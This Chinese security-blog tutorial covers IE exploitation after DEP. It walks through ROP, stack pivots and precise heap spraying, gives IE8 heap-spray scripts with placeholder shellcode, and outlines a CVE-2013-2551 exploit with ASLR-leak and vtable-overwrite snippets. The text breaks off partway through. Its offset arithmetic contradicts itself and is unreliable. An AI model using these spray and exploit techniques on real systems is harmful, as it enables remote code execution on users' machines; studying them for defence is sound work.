<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns:wb="http://open.weibo.com/wb" xml:lang="en" lang="en">
<head>
    <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
    <meta name="viewport"
          content="width=device-width,initial-scale=1,minimum-scale=1,maximum-scale=1,user-scalable=no"/>
    <link rel="shortcut icon" href="http://bobao.360.cn/favicon.ico?v=1.1"/>
    <link rel="alternate" title="安全资讯" href="/rss?type=news" type="application/rss+xml"/>
    <link rel="alternate" title="安全知识" href="/rss?type=learning" type="application/rss+xml"/>
    <link rel="alternate" title="安全圈活动" href="/rss?type=activity" type="application/rss+xml"/>
    <link rel="alternate" title="所有漏洞" href="/rss?type=vul" type="application/rss+xml"/>
    <link rel="alternate" title="通用型漏洞" href="/rss?type=commonvul" type="application/rss+xml"/>
    <link rel="alternate" title="事件型漏洞" href="/rss?type=eventvul" type="application/rss+xml"/>
    <link rel="alternate" title="热门漏洞" href="/rss?type=hotvul" type="application/rss+xml"/>

        <title> 【技术分享】 ​IE浏览器漏洞利用技术的演变 ( 二 ) - 安全客 - 有思想的安全新媒体</title>
    
        <meta name="keywords" content="IE漏洞挖掘,远程溢出漏洞技术,浏览器漏洞技术,挖掘IE漏洞"/>
    
        <meta name="description" content="在上一篇文章中，我们讲了一些早期的 ie相关的漏洞的利用，从最基础，最简单的栈溢出漏洞的利用说起，到相对而言更加复杂的UAF 漏洞利用。透过这些漏洞利用的演变，我们仿佛可以看到人类社会由原始野蛮的社会向一个文明的社会的演变的一个缩影。针对IE的漏洞利用，最开始是使用栈溢出漏洞，栈溢出漏洞的利用非常的简单粗暴。"/>
        <meta property="wb:webmaster" content="224437c7be31d633"/>

    <script type="text/javascript" src="http://s7.qhimg.com/!56caa871/xpc_sync_height.js"></script>
    <link rel="stylesheet" type="text/css" href="/css/reset.css" />
    <link rel="stylesheet" type="text/css" href="/css/common_new.css?v=4.4.2.1" />
    <link rel="stylesheet" type="text/css" href="/css/jquery.notyfy.css" />
    <link rel="stylesheet" type="text/css" href="/css/notyfy.theme.default.css" />
    <link rel="stylesheet" type="text/css" href="/css/s_common.css?v=2.2.7" media="only screen and
    (max-device-width:900px), only screen and (max-width:900px)" />
    <script type="text/javascript" src="/js/jquery.min.js?v=3.1"></script>
    <script type="text/javascript" src="/js/jquery.notyfy.js"></script>
    <script type="text/javascript" src="/js/iscroll.js"></script>
    <script src="http://js.passport.qihucdn.com/5.0.3.js"></script>
    <script type="text/javascript">
        var myScroll, myNavScroll;

        function iscrollLoaded() {
            myScroll = new IScroll('#wrapper',
                {
                    scrollX: true,
                    scrollY: false,
                    bounceEasing: 'circular',
                    eventPassthrough: true,
                    preventDefault: false,
                    bounceTime: 500
                }
            );
        }

        $(function () {

            //导航横向滚动


            function setNavWidth() {

                /* 计算导航宽度 */
                var allWidth = $(window).width();
                var scroller = $('#scroller');

                if (allWidth > 900) {
                    scroller.find('ul').add(scroller.find('.scroll')).removeAttr('style');
                    scroller.css('overflow', 'visible');
                    if (myNavScroll) myNavScroll.destroy();
                } else {

                    var width = 0;
                    scroller.find('.scroll').children('ul').children('li').each(function (index, el) {
                        if (!$(this).hasClass('mobile-hide')) {
                            width += $(this).outerWidth();
                        }
                    });
                    scroller.find('ul').add(scroller.find('.scroll')).width(width);

                    if (myNavScroll) myNavScroll.destroy();

                    myNavScroll = new IScroll('#scroller', {
                        scrollX: true,
                        scrollY: false,
                        momentum: false,
                        click: true
                    });

                }

            }

            setNavWidth();
            $(window).resize(function (event) {
                setNavWidth();
            });

        });

    </script>
</head>
<body onload="iscrollLoaded();">
<div style='margin:0 auto;width:0px;height:0px;overflow:hidden;'>
    <img src=""/>
</div>

<div id="is-mobile"></div>
<div class="container">
        <div class="mobile-header">
        <div class="header clearfix">
            <div class="header-wrapper clearfix">
                <a href="/index/index" class="logo"><img class="slogan" src="/img/logo.png?v=1.5"/></a>
                                <form id="search" class="search-box" action="/search/index" method="GET">
                    <input class="keys" name="keywords" type="text" placeholder="搜索漏洞" required="required">
                    <input class="icon" type="submit" value="">
                    <input type="hidden" name="type" value=""/>
                </form>
                <div class="bug">
                    <div class="name"><span class="seled">全部</span><i class="arrow"></i></div>
                    <ul class="typelist">
                        <li data-index="3"><a href="javascript:void(0);">全部</a></li>
                        <li data-index="0"><a href="javascript:void(0);">漏洞</a></li>
                        <li data-index="1"><a href="javascript:void(0);">资讯</a></li>
                        <li data-index="2"><a href="javascript:void(0);">知识</a></li>
                    </ul>
                </div>
                                <div class="logNreg mobile-hide">
                    <div class="unlog">
                        <i></i>
                        <a href="log.html" class="log">登录</a>
                        <span>|</span>
                        <a href="reg.html" class="reg">注册</a>
                    </div>
                    <div class="loged">
                        <a href="/member/profile" class="user-center"><i></i><span class="user-name-tag">个人中心</span></a>
                        <div class="user-links">
                            <span class="arrow"></span>
                            <ul>
                                <li class="account-setting"><a href="http://i.360.cn/profile/accountmanage"
                                                               target="_blank"><i></i><span>账号设置</span></a></li>
                                <li class="alert-setting"><a href="/keywords/index"
                                                             target="_blank"><i></i><span>告警设置</span></a></li>
                                <li class="bug-alert"><a href="/myalarm/index" target="_blank"><i></i><span>漏洞告警</span></a>
                                </li>
                                <li class="my-knowl"><a href="/mylearn/index" target="_blank"><i></i><span>我的知识</span></a>
                                </li>
                                <li class="my-knowl"><a href="/mycourse/index" target="_blank"><i></i><span>我的课堂</span></a>
                                </li>
                                <li class="my-exit"><a
                                            href="http://login.360.cn/?src=pcw_adlab&op=logout&destUrl=http://bobao.360.cn"><i></i><span>退出系统</span></a>
                                </li>
                            </ul>
                        </div>

                        <a href="/message" class="message-center" target="_blank"><i></i><span>我的消息</span></a>
                        <div class="message-links">
                            <span class="arrow"></span>
                            <ul>
                                <li class="account-setting" style="display:none;"><a href="/myres/index"
                                                                                     target="_blank"><i></i><span>回复我的</span></a>
                                </li>
                                <li class="my-bug"><a href="/myvul/index"
                                                      target="_blank"><i></i><span>我的漏洞</span></a></li>
                                <!--<li class="my-bug"><a href="/myres/index" target="_blank"><i></i><span>我的评论</span></a></li>-->
                                <!--<li class="alert-setting"><a href="###" target="_blank"><i></i><span>提到我的</span></a>
                                </li>-->
                            </ul>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <style type="text/css">
            .nav {
                overflow: hidden;
            }

            .nav .scroll {
                width: auto;
            }
        </style>
        <div id="wrapper">
            <div id="scroller" class="nav">
                <div class="scroll">
                    <ul class="nav-list">
                        <li ><a class="link-nav"
                                                                                 href="/index/index">首页</a>
                        </li>
                        <li >
                        <a class="link-nav" href="/vul/index">漏洞</a>
                        </li>
                        <li >
                        <a class="link-nav" href="/introduce/list">招聘</a>
                        </li>
                        <li >
                        <a class="link-nav" href="/news/index">资讯</a><!--<i class="arrow mobile-hide"></i>
                        <ul class="subnav-list mobile-hide">
                            <li><a class="link-subnav" href="/introduce/list">招聘</a></li>
                        </ul>
			-->
                        </li>
                        <li class="cur">
                        <a class="link-nav" href="/learning/index">知识</a><i class="arrow mobile-hide"></i>
                        <ul class="subnav-list mobile-hide">
                            <li><a class="link-subnav" href="/course/index">学院</a></li>
                        </ul>
                        </li>
                        <li ><a class="link-nav"
                                                               href="/activity/index">活动</a></li>
                        <li class="mobile-hide "><a class="link-nav"
                                                                                                   href="/ctf/index">CTF训练营</a>
                        </li>
                        <li ><a class="link-nav"
                                                               href="/interref/list">安全内参</a></li>
                        <li ><a class="link-nav" href="/app/index">APP</a></li>

                        <!--<li ><a href="/course/index">学院</a></li>-->
                        <!--<li ><a href="/introduce/list">招聘</a></li>-->
                        <!--<li  class="mobile-hide"><a href="/ctf/index">CTF训练营</a></li>-->
                    </ul>
                </div>
            </div>
        </div>
    </div>
    
    <div class="mobile-content">
        <link rel="stylesheet" type="text/css" href="/css/news.css?v=3.5" />
<link rel="stylesheet" type="text/css" href="/ue/SyntaxHighlighter/shCoreDefault.css?v=1.0" />
<style>
    p .syntaxhighlighter {
        width: 80%;
    }
</style>

<div class="cur-pos w1000">当前位置：<a href="http://bobao.360.cn/">安全客</a> &gt;&gt; 知识详情</div>

<div class="content clearfix">
    <div class="main">
        <div class="article">
            <div id="article_box">
                <h2> 【技术分享】 ​IE浏览器漏洞利用技术的演变 ( 二 )</h2>
                <div class="article-msg">
                    <span class="time">2016-09-13 15:46:01</span>
                    
                                        <span class="read">阅读：16702次</span>
                    <span><a style="display: none;" class="good" href="javascript:;"
                             data-target="/learning/good" data-value="g_3029"
                             data-type="learning">点赞(0)</a></span>
                    <span><a class="fav" href="javascript:;" data-target="/mylearning/add"
                             data-pk="3029" data-type="learning">收藏</a></span>
                                        <span><a style="margin-left: 4px;" class="fav" href=""
                             target="_blank">来源： 安全客</a></span>
                    
                    
                    <div style="margin-top:10px; ">
                        <a href="/member/contribute?uid=2553709124" style="color:#848e99;">
                            <img src="http://p1.qhmsg.com/dm/150_150_100/t011d66e4d0ee6ef2b8.jpg" data-is-avatar="true"
                                 style="border: 1px solid #d5d5d5;padding: 2px; width: 80px;height: 80px;border-radius: 43px;"/>
                        </a>

                    </div>
                    <span class="orig">作者：<a href="/member/contribute?uid=2553709124" style="color:#848e99;">for_while</a></span>
                                    </div>
                <hr size="1">
                <div class="article-msg">
                    <p><!-- JiaThis Button BEGIN -->

<!--
<span class="jiathis_style"><span class="jiathis_txt">分享到：</span>
	<a class="jiathis_button_weixin"></a>
	<a class="jiathis_button_tsina"></a>
    <a class="jiathis_button_tqq"></a>
    <a class="jiathis_button_qzone"></a>
    <a class="jiathis_button_renren"></a>
    <a class="jiathis_button_xiaoyou"></a>
    <a href="http://www.jiathis.com/share" class="jiathis jiathis_txt jiathis_separator jtico jtico_jiathis" target="_blank"></a>
</span>

-->
</p>
                </div>
                <p><p style="text-align: center; text-indent: 0em;"><span style="font-size: 18px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><strong><img src="http://p1.qhimg.com/t010ee38afe0e652614.jpg" title="t012b5b150de9b44586.jpg" alt="http://p7.qhimg.com/t012b5b150de9b44586.jpg"/></strong></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><p style="white-space: normal; text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; color: rgb(0, 112, 192);"><strong>作者：</strong></span><a href="http://bobao.360.cn/member/contribute?uid=2553709124" target="_blank" style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; color: rgb(0, 112, 192);"><strong>hac425</strong></a></p><p style="white-space: normal; text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; color: rgb(0, 112, 192);"><strong>稿费：500RMB（不服你也来投稿啊！）</strong></span></p><p style="white-space: normal; text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; color: rgb(0, 112, 192);"><strong>投稿方式：发送邮件至linwei#360.cn，或登陆网页版在线投稿</strong></span></p><p style="text-indent: 2em; text-align: left;"><br/></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><strong>传送门</strong></span></p><hr/><p style="text-indent: 2em; text-align: left;">&nbsp;<span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; color: rgb(255, 0, 0);">【技术分享】 IE浏览器漏洞利用技术的演变 ( 一）&nbsp;</span><a href="http://bobao.360.cn/learning/detail/3021.html" _src="http://bobao.360.cn/learning/detail/3021.html" style="text-decoration: underline; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; color: rgb(255, 0, 0);"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; color: rgb(255, 0, 0);">http://bobao.360.cn/learning/detail/3021.html</span></a></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">前言</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">在上一篇文章中，我们讲了一些早期的 ie相关的漏洞的利用，从最基础，最简单的栈溢出漏洞的利用说起，到相对而言更加复杂的UAF 漏洞利用。透过这些漏洞利用的演变，我们仿佛可以看到人类社会由原始野蛮的社会向一个文明的社会的演变的一个缩影。针对IE的漏洞利用，最开始是使用栈溢出漏洞，栈溢出漏洞的利用非常的简单粗暴，我们可以直接通过过长的字符串覆盖掉函数的返回地址或者seh链的结构来直接的劫持掉程序的eip，控制程序的执行流程。在实际利用时，为了稳定性和简便性，一般先使用堆喷射技术将我们的 payload (nops + shellcode)布置到一个可以预测的地址，这个地址一般是0x0c0c0c0c，之后将通过溢出把 eip的值控制为 0x0c0c0c0c 实现，之后程序会跳入到nops 块中，最终执行到shellcode区，完成漏洞利用。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">可以看到这整个过程非常的简单粗暴，用仙果的话来说就是这样的漏洞利用”不优雅＂，后来UAF漏洞出现了，漏洞利用技术也变得优雅了起来，针对 UAF漏洞的利用，hacker们的手法也比之前的栈溢出漏洞的利用手法，精细了不少，利用的套路是：等存在漏洞的对象被释放后，申请一些大小与被释放对象所占内存大小相同的对象，实现＂占坑＂，之后在修改那块内存的数据（一般是开始４字节，虚表），最后调用虚函数，触发漏洞，劫持eip。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">可以很明显的感受到整个漏洞利用的流程比之前要优雅了不少，hacker们需要小心的操纵内存的分配，以实现对那块释放的内存的重利用。当然这整个过程还是有＂不优雅＂的地方，在漏洞利用的最后阶段，我们利用的还是最开始的那一种布置shellcode的方法，就直接大量地喷射内存，不管三七二十一把eip设为0x0c0c0c0c 实现漏洞的利用。这种方式在没有DEP 的情况下还是可取的。但是 DEP 爸爸一来，什么都变了。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">那么DEP到底啥呢？DEP（数据执行保护，Data Execution Prevention）的基本原理是将数据所在的内存页标识为不可执行，当程序溢出成功转入ShellCode时，程序会尝试在数据页面上执行指令，此时CPU就会抛出异常，而不是去执行恶意指令。而我们之前的漏洞利用的最后一步都是直接跳到数据区去执行代码的，这样在DEP作用下我们先前所有的漏洞利用都会被操作系统终结到最后一步，是不是很气？我觉得当时的hacker们一定是非常无奈的（我都搞定eip了，你却不让我执行我的代码，你逗我玩呢？</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">但 hacker的信条里没有＂放弃＂这个词，有的只是＂突破一切＂！一段时间的困惑之后，有些聪明hacker发现，你不是不让我执行我的数据吗？那好我就不执行我的数据，我执行你程序自身的数据总可以了吧。应为程序自身肯定是需要执行代码的，于是我们可以通过重用程序的代码把他们拼接起来最终实现我们需要的功能。这种技术被称为ROP（Return Oriented Programming，返回导向编程）。关于ROP技术详细介绍，利用的方式网上已有大量的文章进行了说明，请不熟悉的读者自行百度，在这里就不赘述了。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">IE浏览器漏洞利用技术的演变</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">对于DEP，现在我们就有了ROP这一技术来对其进行绕过。引入了ROP技术的同时，也引入新的问题，大多数情况下我们不会用rop链来实现我们shellcode所需的功能，更通用的方式是通过调用一些系统提供的可以设置内存属性的函数来将shellcode所在内存区域设置为可执行属性，这样一来我们就能执行我们的输入数据了。我们知道用于rop的一些代码段（我们称之为gadgets) 是一些以 ret指令结尾的代码片段。而 ret 指令是对栈上的数据进行操作的，而现实是我们现在获得的ie漏洞基本没有可以控制栈数据的了。我们能控制的只有堆上面的数据（通过使用＂堆喷射＂技术），这时我们要用到一个有趣的指令：xchg reg ,esp 这样的一条指令作用是交换reg寄存器与esp寄存器的值。而在一些堆相关的漏洞中我们往往能控制至少一个寄存器的值，设想一下我们将某个寄存器的值设为0x0c0c0c0c (没错又是这个有趣的地址)，再使用一条xchg指令将esp的值和该寄存器的值互换，这样一来程序的栈就变成了我们可控的地方了，漏洞利用是不是又变得优雅了一些。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">现在还剩下最后一个问题：在我们成功执行rop链设置shellcode所在内存为可执行属性之前，我们没有办法执行堆上的数据的，所以在我们使用类似于xchg reg ,esp 的指令切换好栈后，我们ret的地址必须是在rop链的第一个地址。要解决这个问题就要用到＂精准的堆喷射＂技术。我们知道动态申请的内存的地址是不断变化的，所以位于　0x0c0c0c0c地址处的数据也应该是会变化的，所谓的＂精准的堆喷射＂就是使用一些特殊的堆布局使得位于0x0c0c0c0c处的数据为一个恒定的值，这样一来，在ie 中使用rop的又一道难关被突破。下面来实战下＂精准的堆喷射＂吧！</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">先来一个可以在ie8上进行堆喷射的脚本：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:plain;toolbar:false">&lt;html&gt;
&lt;head&gt;
&lt;script&gt;
&nbsp;//&nbsp;[&nbsp;Shellcode&nbsp;]
var&nbsp;shellcode&nbsp;=&nbsp;&quot;\xcc\xcc&quot;
&nbsp;var&nbsp;fill&nbsp;=&nbsp;unescape(&quot;%u0c0c%u0c0c&quot;);
&nbsp;while&nbsp;(fill.length&nbsp;&lt;&nbsp;0x1000){
&nbsp;fill&nbsp;+=&nbsp;fill;
&nbsp;}
&nbsp;//&nbsp;[&nbsp;fill&nbsp;each&nbsp;chunk&nbsp;with&nbsp;0x1000&nbsp;bytes&nbsp;]
&nbsp;evilcode&nbsp;=&nbsp;shellcode&nbsp;+&nbsp;fill.substring(0,&nbsp;0x800&nbsp;-&nbsp;shellcode.length);
&nbsp;//&nbsp;[&nbsp;repeat&nbsp;the&nbsp;block&nbsp;to&nbsp;512KB&nbsp;]
&nbsp;while&nbsp;(evilcode.length&nbsp;&lt;&nbsp;0x40000){
&nbsp;evilcode&nbsp;+=&nbsp;evilcode;
&nbsp;}
&nbsp;//&nbsp;[&nbsp;substring(2,&nbsp;0x40000&nbsp;-&nbsp;0x21)&nbsp;-&nbsp;IE8&nbsp;]
&nbsp;var&nbsp;block&nbsp;=&nbsp;evilcode.substring(2,&nbsp;0x40000&nbsp;-&nbsp;0x21);
&nbsp;//&nbsp;[&nbsp;Allocate&nbsp;200&nbsp;MB&nbsp;]
&nbsp;var&nbsp;slide&nbsp;=&nbsp;new&nbsp;Array();
&nbsp;for&nbsp;(var&nbsp;i&nbsp;=&nbsp;0;&nbsp;i&nbsp;&lt;&nbsp;400;&nbsp;i++){
&nbsp;slide[i]&nbsp;=&nbsp;block.substring(0,&nbsp;block.length);
&nbsp;}
(1);
&lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">弹出弹框(为了便于调试，相当于下个断点）时用调试器附加上，看看内存的布局．</span></p><p style="text-align: center; text-indent: 0em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><img src="http://p5.qhimg.com/t0100ba02da8c5299f9.png"/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">可以看到我们已经能够将数据喷射到 <span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; color: rgb(255, 0, 0);"><strong>0x0c0c0c0c </strong></span>这个地址处了。下一步我们该做的就是控制<span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 32px;">&nbsp;</span><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 32px; color: rgb(255, 0, 0);"><strong>0x0c0c0c0c&nbsp;</strong></span>这个地址处的值。基于前辈们的努力，我们可以使用以下方法控制该处的值。具体的做法如下：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">1.当完成堆的喷射之后，查看<strong style="color: rgb(255, 0, 0); font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 32px; white-space: normal;">0x0c0c0c0c</strong>所在的堆块的属性。做法是：在完成堆喷射后，使用windbg附加上ie，输入：＂<span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; color: rgb(255, 0, 0);"><strong>!heap -p -a 0c0c0c0c</strong></span>＂命令。</span></p><p style="text-align: center; text-indent: 0em;"><img src="http://p4.qhimg.com/t01e6074efff6eec14d.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">2.来一波数学计算吧</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">以看出，0x0C0C0C0C所在堆块的<span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; color: rgb(255, 0, 0);"><strong>UserPtr为0x0c050020</strong></span>，可以计算：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:plain;toolbar:false">0x0C0C0C0C&nbsp;-&nbsp;0x0c050020&nbsp;=&nbsp;0x70BEC
0x50BEC&nbsp;/&nbsp;2&nbsp;=&nbsp;0x385F6
0x285F6&nbsp;%&nbsp;0x1000&nbsp;=&nbsp;0x5F6</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">其中第一个表达式求出0x0C0C0C0C到UserPtr的距离，因为JavaScript中字符串是Unicode形式的，所以在第二个表达式中我们进行了除以2的操作，又因为堆块的对齐粒度是0×1000，所以将结果对0×1000进行取余。<strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em; color: rgb(255, 0, 0);">注意每一次查看0x0C0C0C0C所在堆块的UserPtr会不尽相同，但是在特定的环境下计算出来的最终结果基本是一致的</span></strong>，于是堆中每一块0×1000大小的数据看起来如图所示：</span></p><p style="text-align: center; text-indent: 0em;"><img src="http://p4.qhimg.com/t01bf2beadd6f97af8a.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">我们通过把每个0×1000大小的数据块，以上图所示的样子布局就能控制好 0x0c0c0c0c 处的值．</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">修改后堆喷射脚本为：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:plain;toolbar:false">&nbsp;&lt;html&gt;
&nbsp;&lt;head&gt;
&lt;script&gt;
&nbsp;//&nbsp;[&nbsp;Shellcode&nbsp;]
var&nbsp;shellcode&nbsp;=&nbsp;unescape(&quot;%u4242%u4242&quot;);
var&nbsp;rop_chains&nbsp;=&nbsp;unescape(&quot;%u4141%u4141&quot;);
&nbsp;var&nbsp;fill&nbsp;=&nbsp;unescape(&quot;%u0c0c%u0c0c&quot;);
&nbsp;while&nbsp;(fill.length&nbsp;&lt;&nbsp;0x1000){
&nbsp;fill&nbsp;+=&nbsp;fill;
&nbsp;}
&nbsp;//&nbsp;[&nbsp;padding&nbsp;offset&nbsp;]
&nbsp;padding&nbsp;=&nbsp;fill.substring(0,&nbsp;0x5F6);
&nbsp;//&nbsp;[&nbsp;fill&nbsp;each&nbsp;chunk&nbsp;with&nbsp;0x1000&nbsp;bytes&nbsp;]
&nbsp;evilcode&nbsp;=&nbsp;padding&nbsp;+&nbsp;rop_chains&nbsp;+&nbsp;shellcode&nbsp;+&nbsp;fill.substring(0,&nbsp;0x800&nbsp;-&nbsp;padding.length&nbsp;-&nbsp;rop_chains.length&nbsp;-&nbsp;shellcode.length);
&nbsp;//&nbsp;[&nbsp;repeat&nbsp;the&nbsp;block&nbsp;to&nbsp;512KB&nbsp;]
&nbsp;while&nbsp;(evilcode.length&nbsp;&lt;&nbsp;0x40000){
&nbsp;evilcode&nbsp;+=&nbsp;evilcode;
&nbsp;}
&nbsp;//&nbsp;[&nbsp;substring(2,&nbsp;0x40000&nbsp;-&nbsp;0x21)&nbsp;-&nbsp;IE8&nbsp;]
&nbsp;var&nbsp;block&nbsp;=&nbsp;evilcode.substring(2,&nbsp;0x40000&nbsp;-&nbsp;0x21);
&nbsp;//&nbsp;[&nbsp;Allocate&nbsp;200&nbsp;MB&nbsp;]
&nbsp;var&nbsp;slide&nbsp;=&nbsp;new&nbsp;Array();
&nbsp;for&nbsp;(var&nbsp;i&nbsp;=&nbsp;0;&nbsp;i&nbsp;&lt;&nbsp;400;&nbsp;i++){
&nbsp;slide[i]&nbsp;=&nbsp;block.substring(0,&nbsp;block.length);
&nbsp;}
(1);
&lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">效果就是：</span></p><p style="text-align: center; text-indent: 0em;"><img src="http://p5.qhimg.com/t01810b343b0ace4c32.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">可以看到现在的0x0c0c0c0c处的值恰好为rop链的开头。又一个难关被攻克。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">下面进入今天的这个漏洞，今天要完成漏洞利用的漏洞是: <strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; color: rgb(255, 0, 0);">CVE-2013-2551 IE COALineDashStyleArray </span></strong>整数溢出漏洞。</span></p><p style="text-indent: 2em; text-align: left;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">漏洞产生的原理是</span></strong></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">在更改dashstyle数组的长度时，程序会将重新设置的长度与当前数组长度进行比较，如果大于当前数组长度就会重新分配一块内存来存储数组。小于的话就不分配内存。而在进行长度值比较时，使用的是有符号比较，所以当我们将长度设为0-1=0xffffffff时，就会发生整数溢出，使得不重新分配内存，但是数组的长度已经变大，于是我们就能越界读写相邻的内存了。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">那么我们应该怎么利用这种漏洞呢？套路是，分配大量的其他的对象，在他们的中间插入一个存在越界读写漏洞的对象（在这里是dashstyle数组）。之后触发漏洞，读取相邻对象的一些特殊的结构，来计算模块基地址绕过ASLR ,构造rop链，之后再次触发漏洞，将相邻对象的虚表指针修改以控制程序的执行流程。</span></p><p style="text-indent: 2em; text-align: left;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">具体到这个漏洞的做法是：</span></strong></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:plain;toolbar:false">1.通过构造0x400个COARuntimeStyle对象，在第0x301处创建一个包含44个元素的dashstyle数组.这样一来会分配4*44=0xb0大小的ORG数组．这样一来ORG数组和COARuntimeStyle对象就会相邻，此时利用漏洞越界访问到位于COARuntimeStyle对象偏移0x58的字符串（即marginLeft&nbsp;属性值）的地址，之后将其地址设置为0x7ffe0300，在这个地址处存放的值与ntdll.dll模块的基地址有一个固定的偏移，这样我们再读取marginLeft&nbsp;属性值就能读到那个有固定偏移的值，在通过计算我们可以得到ntdll.dll模块基地址绕过aslr.　poc中的相关代码如下：
&nbsp;&nbsp;&nbsp;&nbsp;vml1.dashstyle.array.item(0x2E+0x16)&nbsp;=&nbsp;0x7ffe0300;
&nbsp;&nbsp;&nbsp;&nbsp;var&nbsp;leak&nbsp;=&nbsp;a[i].marginLeft;
2.通过第一步中泄露出来的基地址，使用ntdll模块中的指令构造出&nbsp;rop链来调用ntdll!ZwProtectVirtualMemory　函数将shellcode地址设置为可读可写可执行权限，从而绕过&nbsp;DEP&nbsp;，并利用＂精准堆喷射＂技术将rop链的开头喷射到&nbsp;0x0c0c0c0c这个地址处，再次的触发漏洞，修改对象的虚表，从而获得代码执行．覆盖虚表的关键代码如下：
&nbsp;&nbsp;&nbsp;&nbsp;vml1.dashstyle.array.length&nbsp;=&nbsp;0&nbsp;-&nbsp;1;
